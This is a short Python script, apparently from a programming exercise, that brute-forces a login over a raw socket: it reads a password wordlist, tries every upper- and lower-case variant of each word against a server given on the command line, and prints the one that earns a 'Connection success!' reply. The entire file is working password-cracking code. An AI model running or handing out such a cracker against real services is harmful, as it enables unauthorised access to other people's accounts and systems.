import sys
import socket
import itertools

args = sys.argv
address = (args[1], int(args[2]))

passwords = open('passwords.txt', 'r')

client_socket = socket.socket()
client_socket.connect(address)

for line in passwords:

    line = line.strip('\n')
    chars = [[c, c.upper()] if not c.isdigit() else c for c in line]
    my_iter = itertools.product(*chars)

    for pwd in my_iter:
        message_bytes = ''.join(pwd).encode()
        client_socket.send(message_bytes)

        response = client_socket.recv(1024).decode()

        if response == "Connection success!":
            print(''.join(pwd))
            break
        elif response == "Too many attempts":
            break

    else:
        continue

    break

passwords.close()
client_socket.close()
